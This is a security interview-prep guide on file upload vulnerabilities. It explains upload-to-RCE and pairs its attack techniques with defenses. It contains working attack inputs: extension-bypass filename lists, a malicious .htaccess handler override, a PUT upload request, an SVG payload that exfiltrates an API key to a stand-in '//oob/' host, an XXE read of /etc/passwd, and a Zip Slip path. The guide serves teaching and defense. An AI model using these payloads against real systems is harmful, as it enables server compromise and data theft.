# File Upload Vulnerabilities

> An upload turns dangerous when the file's content is later interpreted (executed as server-side code, parsed as XML/SVG, or served with an active content type that a browser runs) or when the file's name/path is trusted (traversal, overwrite). The worst case, upload to remote code execution, needs two conditions to hold at once: the file contains code the server's runtime will execute, and it lands somewhere the server maps to that runtime and will serve. Every check a defender adds (extension, Content-Type, magic bytes, dimensions) is trying to break one of those two conditions, and every bypass below is about defeating one specific check while keeping both conditions true. The durable root-cause framing: validation of what a file "is" is guesswork against an attacker who controls every byte, so the real control is making the storage location non-executable and the served response inert. Get that right and a script that slips past validation still cannot run.

**Interview frequency:** Common

*See also: [File Upload and Storage Security](103-file-upload-storage-security.md) for what happens after a file passes upload validation: storage architecture, retrieval authorization, encryption at rest, and retention, forked by whether the content is public, private, or system-generated.*

## How it works

To reason about upload-to-RCE you must know how a web server decides to execute a static file (PortSwigger).<sup>[[1]](#ref1)</sup> On request, the server parses the path, extracts the extension, and maps it to a MIME type via preconfigured rules. Then:

- Non-executable type (image, static HTML): the bytes are returned as-is.
- Executable type (for example `.php`) and the server is configured to execute it: the server sets request variables and runs the script, returning its output.
- Executable type but not configured to execute here: usually an error, but sometimes the source is served as `text/plain` (a source-disclosure bug, not RCE).

So RCE requires an extension the server both recognizes as executable and is configured to run in the directory where the file lands. That is why "which directory, configured how" matters as much as "which extension."

A multipart upload the attacker fully controls looks like this; note that three separate fields (`filename`, the part's `Content-Type`, and the raw bytes) are all attacker-set:

```
POST /images HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="image"; filename="avatar.php"
Content-Type: image/jpeg

(payload: a short script that runs a command from the cmd parameter and prints the result)
------X--
```

   The minimal payloads (PortSwigger)<sup>[[1]](#ref1)</sup>: one that reads and prints an arbitrary server-side file, and one that runs a command taken from a `command` query parameter and prints the result, driven by `GET /uploads/shell.php?command=id`.

Web servers commonly use the `filename` field to decide the save name and location, which is exactly why filename handling is a security boundary and not cosmetic.

## Quick reference

```
POST /images HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="image"; filename="avatar.php"
Content-Type: image/jpeg

(payload: a short script that runs a command from the cmd parameter and prints the result)
------X--
# Three attacker-controlled fields: filename (avatar.php), Content-Type (image/jpeg,
# spoofed), and the raw bytes. If the server trusts any one of these instead of
# verifying content and execution context, this becomes a web shell.
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| A file's execution depends on two independent facts both being true: the extension is one the server recognizes as executable, and the directory it lands in is configured to execute it | Web server's extension-to-handler mapping, per directory | An uploaded `.php` file lands in a directory where PHP execution is still enabled, satisfying both conditions at once | <sup>[[1]](#ref1)</sup> |
| The declared `Content-Type` and file extension are never trusted as proof of file type; only verified content (signature/magic bytes, re-encoding) is | Content-validation gate, server-side, on the actual bytes | `Content-Type: image/jpeg` set on a `.php` body passes a header-only check; a GIF-signature-prefixed polyglot passes a signature-only check | <sup>[[1]](#ref1)</sup> |
| Extension checks run after full decoding of the filename, and use an allowlist, not a blocklist | Filename validation logic, applied post-decode | `%00`, trailing dots/spaces, or unicode sequences that normalize to `.` after decoding smuggle a second effective extension past a blocklist validated pre-decode | <sup>[[2]](#ref2)</sup> |
| The upload directory never honors per-directory config files the upload feature itself can write to | Web server config (forbid uploading `.htaccess`/`web.config`, no per-directory override in the upload dir) | An uploaded `.htaccess` remaps an otherwise-inert extension to the PHP handler, turning a blocked extension into an executable one | <sup>[[1]](#ref1)</sup> |
| Archive entry paths are canonicalized and verified to stay within the extraction target directory before any bytes are written | Archive-extraction routine, per entry | An entry named with `../` traversal sequences (Zip Slip) writes outside the intended directory to any path the process can reach | <sup>[[3]](#ref3)</sup> |
| The user-supplied filename never reaches a filesystem path; storage uses a generated identifier instead | Upload-handling code, at the point the file is persisted to disk/object storage | A filename containing `../../` is used directly to derive the save path, escaping the intended directory or overwriting an existing file | <sup>[[1]](#ref1)</sup> |
| Validation completes and passes before the file is written to any path the web server will serve or execute | Upload pipeline ordering (validate-then-move, staged in a randomized temp path) | Writing to the live path first and deleting on AV/validation failure leaves a race window where the file is both present and requestable | <sup>[[1]](#ref1)</sup> |

## Attack techniques

### 1. Unrestricted upload to web shell

If there is no real validation and the upload dir executes scripts, upload `shell.php` and request it. This is the ceiling of the bug: arbitrary read/write, data exfiltration, and pivoting to internal infrastructure and other hosts.

### 2. Content-Type (MIME) spoofing

The per-part `Content-Type` is client-controlled. Servers that trust it to gate uploads ("only `image/jpeg` and `image/png`") are bypassed by setting `Content-Type: image/jpeg` on a `.php` body in Burp Repeater. WHY: nothing ties the declared MIME to the actual bytes unless the server verifies content.

### 3. Extension blocklist gaps

Blocklisting is inherently leaky; equivalent executable extensions are easy to miss:

```
PHP:   .php3 .php4 .php5 .php7 .pht .phtml .phar .phps .inc
JSP:   .jsp .jspx .jspf .jsw .jsv
ASP:   .asp .aspx .ashx .asmx .ascx .cshtml .cer .asa
Other: .shtml (SSI)  .pl .cgi
```

### 4. Extension obfuscation (parser discrepancies)

Defeat a blocklist by making the validator and the file system / handler disagree about the effective extension (PortSwigger)<sup>[[1]](#ref1)</sup>:

```
shell.pHp                 # case, if validation is case-sensitive but the MIME map is not
shell.php.                # trailing dot stripped by the OS -> lands as shell.php
shell.php%20  shell.php.. # trailing space/dots stripped
shell.php%00.jpg          # null-byte truncation on legacy C-backed stacks
shell.asp;.jpg            # semicolon confusion (IIS legacy)
shell%2Ephp               # URL-encoded dot, if validated before decoding
shell.php.jpg             # double extension (see #5)
shell.p.phphp             # non-recursive strip of ".php" leaves ".php"
```

Also multibyte/unicode sequences (`0xC0 0xAE`, `0xC4 0xAE`, `0xC0 0x2E`) that normalize to `.` after UTF-8 to ASCII conversion. WHY: high-level validation code and low-level path handling parse the filename by different rules; the gap is the bug.

### 5. Double extension plus server config

`shell.php.jpg` is inert unless a handler executes on a non-terminal match. Apache with a loose `AddHandler application/x-httpd-php .php` (rather than `SetHandler` scoped by `<FilesMatch>`) or `MultiViews` will execute any file whose name contains `.php`, so `shell.php.jpg` runs. This is the classic reason double extensions matter: it is a server-config bug, not just a naming trick.

### 6. Magic-byte / content-sniff spoofing and polyglots

Stronger servers check that content matches the type: images have signatures (`FF D8 FF` JPEG, `GIF89a` GIF, `89 50 4E 47` PNG) and real dimensions, so a bare PHP file "has no dimensions" and is rejected. Bypass by prepending a valid signature or embedding the payload in metadata so `getimagesize()` and signature checks pass while the file still executes as PHP:

```
GIF89a;
(payload: a short script that runs a command from the cmd parameter and prints the result)
```

ExifTool trivially writes a PHP payload into an image comment/EXIF field, producing a polyglot that is a valid image and valid PHP (PortSwigger).<sup>[[1]](#ref1)</sup> Image libraries that validate but do not fully re-encode leave the payload intact.

### 7. Overriding server config via uploaded config files

If the upload dir is writable and the server honors per-directory config, upload the config itself to make an inert extension execute. Apache reads `.htaccess`; IIS reads `web.config` (PortSwigger)<sup>[[1]](#ref1)</sup>:

```apache
# .htaccess uploaded into the upload dir
AddType application/x-httpd-php .l33t
# now shell.l33t executes as PHP even though .php was blocked
```

```xml
<!-- web.config: map an arbitrary extension to a handler, or enable execution -->
<staticContent><mimeMap fileExtension=".json" mimeType="application/json"/></staticContent>
```

### 8. PUT-method upload

If the server allows `PUT` (probe with `OPTIONS`), you can write a file without any upload form (PortSwigger)<sup>[[1]](#ref1)</sup>:

```
PUT /images/exploit.php HTTP/1.1
Content-Type: application/x-httpd-php

(payload: reads and prints the contents of a server-side file path taken from the request)
```

### 9. Dangerous content that needs no server-side execution

- SVG is XML, so it is both a stored-XSS and an XXE vector when the "image" is served inline or parsed server-side:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>fetch('/api/key').then(r=>r.text()).then(t=>new Image().src='//oob/'+t)</script>
</svg>
<!-- XXE variant if parsed server-side -->
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>
```

   - HTML/`.htm` uploads served from the app's own origin are stored XSS (PortSwigger notes same-origin policy means this only works if the file is served from the origin it was uploaded to).<sup>[[1]](#ref1)</sup>
   - XML / DOCX / XLSX parsed server-side (Apache POI, XML libs) are XXE (PortSwigger's "parsing of uploaded files"<sup>[[1]](#ref1)</sup>; OWASP lists XXE and ImageTragick as parser threats<sup>[[2]](#ref2)</sup>).
   - Archives cause Zip Slip: an entry named `../../../../var/www/html/shell.php` escapes the extraction directory and writes anywhere the process can (Snyk's 2018 Zip Slip disclosure affected many libraries across ecosystems).<sup>[[3]](#ref3)</sup> Zip bombs / billion-laughs XML cause DoS by decompression (OWASP).<sup>[[2]](#ref2)</sup>

### 10. Filename path traversal, overwrite, and IDOR

If the server derives the save path from the user filename, `../../` in the name places the file outside the intended dir (into a webroot or over a sensitive file). Controlling the destination name lets you overwrite config, keys, or other users' files. Predictable/sequential stored names (or brute-forceable IDs) yield IDOR: read other users' uploads. OWASP: filenames can carry traversal, leading periods (hidden files), and OS-reserved names.<sup>[[2]](#ref2)</sup>

### 11. Race conditions

Some apps write the file to its live path, then delete it if AV/validation fails; for the milliseconds it exists you can request and execute it (PortSwigger).<sup>[[1]](#ref1)</sup> URL-based uploads (server fetches a URL) create a fetch-then-validate window; if the temp directory name comes from a weak PRNG like PHP `uniqid()`, it is brute-forceable, and padding the file to slow processing widens the window.

### 12. Secondary parser exploits and resource abuse

Malicious media triggering library bugs: ImageMagick "ImageTragick" (CVE-2016-3714) reached RCE via crafted image directives<sup>[[4]](#ref4)</sup>; crafted media can drive ffmpeg SSRF/file read; pixel-flood / decompression bombs exhaust memory. Missing `X-Content-Type-Options: nosniff` lets browsers content-sniff an "image" into HTML/JS for XSS.

Detection/confirmation across these: request the uploaded path and look for command output (RCE), an OOB DNS/HTTP callback (SVG/XXE, blind XXE, Zip Slip that writes a beacon), a rendered `alert`/exfil (stored XSS), or file contents in the response (XXE/LFI). Blind variants rely on OOB interaction exactly as with SSRF.

## Defense

### Real fix

1. Make the storage non-executable and serve it inert. Store uploads on a different host or object store (S3/GCS), or at minimum outside the webroot, and serve them through an application handler that maps an opaque id to the file and sets `Content-Disposition: attachment`, a safe `Content-Type`, and `X-Content-Type-Options: nosniff`. This single control kills upload-to-RCE even if a script passes validation, and defangs content-sniffing XSS. OWASP's storage priority: different host > outside webroot > inside webroot write-only.<sup>[[2]](#ref2)</sup>

2. Disable execution in the upload location. If files must live under the webroot, strip handler mappings for that directory: no `AddHandler`/`SetHandler` for PHP/CGI, `php_admin_flag engine off`, remove CGI exec, and forbid uploading `.htaccess`/`web.config` (they are the mechanism to re-enable execution). Do not let user uploads share a directory with executable app code.

3. Rename to a random identifier and discard the user filename. Generate a UUID/GUID for storage; keep the original name only as display metadata after input validation. This removes path traversal, overwrite, null-byte, and double-extension tricks in one move (PortSwigger<sup>[[1]](#ref1)</sup>, OWASP<sup>[[2]](#ref2)</sup>).

4. Safe archive handling. For any zip/tar, canonicalize each entry path and verify it stays within the target directory before writing (defeats Zip Slip); enforce per-entry and total-uncompressed size and entry-count limits (defeats zip bombs). OWASP recommends avoiding ZIP acceptance where possible and safely extracting via hardened stream handling.<sup>[[2]](#ref2)</sup>

5. Do not persist to the live filesystem before validation, and prefer the framework's upload pipeline. Frameworks that stage to a randomized temp path, validate, then move, avoid the AV-delete and URL-fetch race windows. Rolling your own is where the subtle races appear (PortSwigger).<sup>[[1]](#ref1)</sup>

### Defense in depth

1. Allowlist extensions, enforced server-side after decoding, matched to business need. Permit only the specific safe extensions the feature requires (image feature: one agreed image type; CV feature: `pdf`/`docx`). Validate after fully decoding the filename so `%00`/`%2E`/unicode tricks cannot smuggle a second extension. Allowlists are far safer than blocklists because you enumerate the few safe types, not the infinite dangerous ones (PortSwigger<sup>[[1]](#ref1)</sup>, OWASP<sup>[[2]](#ref2)</sup>).

2. Validate content, not just the header. Check the file signature/magic bytes and, for images, intrinsic properties, as a secondary gate (never as the sole gate, since polyglots defeat it). The strong version is to re-encode/transcode media through a trusted library so any embedded payload or polyglot does not survive; rasterize or sanitize SVG (or disallow SVG entirely); run PDFs/Office files through Content Disarm and Reconstruction (CDR). OWASP: image rewriting destroys injected content; validate DOCX with Apache POI.<sup>[[2]](#ref2)</sup>

3. Enforce authz, limits, scanning, and origin isolation. Only authenticated/authorized users upload; enforce size, rate, and filename-length limits; scan with AV or a sandbox; authorize every download to prevent IDOR; and serve user content from a separate sandbox origin so even a stored-XSS file cannot touch the main app's cookies/DOM. Protect the upload endpoint against CSRF.

Reference: OWASP File Upload Cheat Sheet<sup>[[2]](#ref2)</sup>, OWASP Web Security Testing Guide (Testing Upload of Malicious Files)<sup>[[5]](#ref5)</sup>, OWASP Input Validation Cheat Sheet, and ASVS V12 (File and Resources) requirements on upload validation, storage, and serving.

## Interviewer probes

Mid: "The upload endpoint checks that the file's Content-Type is `image/jpeg` and rejects anything else. Is that sufficient validation?"

Principal: No, that's the weakest possible check. The per-part `Content-Type` is a client-set multipart header, spoofed by changing one field in the request. Checking the extension is `.jpg` is only slightly better, since polyglots and double extensions combined with a loose Apache handler defeat that too. The senior answer doesn't lead with validation at all; it leads with making the storage location non-executable and serving content inert, then treats extension and content checks as defense-in-depth layered on top.

Mid: "You've confirmed the app accepts a `.php` file with a spoofed image Content-Type. Is that RCE?"

Principal: Not necessarily, and that's the part people skip. Upload-to-RCE needs two things true at once: the extension has to be one the server recognizes as executable, and the file has to land in a directory the server is actually configured to execute scripts from. An accepted `.php` upload into a directory with execution disabled, or outside the webroot entirely, is a stored file, not RCE. You have to check the directory's handler configuration, not just what extensions get past the filter.

Mid: "The app already restricts uploads to image types, including SVG since it's technically a vector image format. Any concern there?"

Principal: Yes, SVG shouldn't be on that allowlist without extra handling. It's XML, not a raster image, so it's both a stored-XSS vector when rendered inline on the same origin, and an XXE vector when parsed server-side. Teams that whitelist "images" and let SVG through the same path as JPEG/PNG have handed themselves a live XSS/XXE sink. The same applies to DOCX/XLSX/XML uploads for the same underlying reason, they're all parsed document formats, not opaque binary blobs.

Mid: "The extension allowlist is tight, it only permits `.jpg`, `.png`, and `.pdf`. Does that close out the upload risk?"

Principal: It closes the executable-extension risk, but not the whole class. Even a perfect allowlist doesn't stop the dangerous-without-RCE category, XXE through a parsed PDF, or Zip Slip if any of those formats get extracted server-side. Allowlisting beats blocklisting because you enumerate the few safe types instead of the infinite dangerous ones, but it's one layer; storage and serving controls have to hold up independently of what the extension filter catches.

Mid: "What's the single highest-leverage change you'd make to an upload pipeline that currently trusts the user-supplied filename?"

Principal: Stop using it. Generate a random identifier for storage and keep the original filename only as display metadata, never as anything that touches a filesystem path. That one change removes path traversal, overwrite, null-byte tricks, and double-extension tricks simultaneously, because none of those attacks work if the attacker's string never reaches a save path. Candidates who only talk about extension filtering are missing that the filename itself is attacker-controlled data being used to make a filesystem decision.

Mid: "You found a Zip Slip issue in the file upload feature. Is that the same bug as the path traversal you found in the filename field?"

Principal: Related root cause, different sink. Generic filename traversal happens on the upload request's filename parameter; Zip Slip happens on entry names inside an archive the user uploaded, exploited during extraction, not during the upload itself. Both are CWE-22 in spirit, but the fix location differs: Zip Slip needs canonicalize-and-prefix-check applied per archive entry plus decompression limits, independent of whatever filename validation exists on the upload endpoint. Treating them as the same finding with the same fix is a tell that the traversal mechanism wasn't actually understood.

Mid: "Say you've locked down storage location and execution. What's left to worry about on the serving side?"

Principal: Content-sniffing on the response. Even a non-executable, correctly-stored file can become an XSS vector if the browser sniffs an uploaded "image" as HTML or JavaScript and renders it. The trifecta that closes that off is `X-Content-Type-Options: nosniff` to stop MIME sniffing, `Content-Disposition: attachment` to force a download instead of inline rendering, and serving user content from a separate origin so that even a successful stored-XSS file can't reach the main app's cookies or DOM. Naming only one of the three, and not explaining why each piece matters, is the usual gap.

## Sources

<a id="ref1"></a>[1] PortSwigger Web Security Academy, "File upload vulnerabilities". Retrieved 2026. https://portswigger.net/web-security/file-upload

<a id="ref2"></a>[2] OWASP, "File Upload Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

<a id="ref3"></a>[3] Snyk, "Zip Slip Vulnerability" (arbitrary file write via archive extraction). 2018. https://github.com/snyk/zip-slip-vulnerability

<a id="ref4"></a>[4] ImageTragick (ImageMagick CVE-2016-3714) advisory. Retrieved 2026. https://imagetragick.com/

<a id="ref5"></a>[5] OWASP Web Security Testing Guide, "Test Upload of Malicious Files" (WSTG-BUSL-09). Retrieved 2026. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
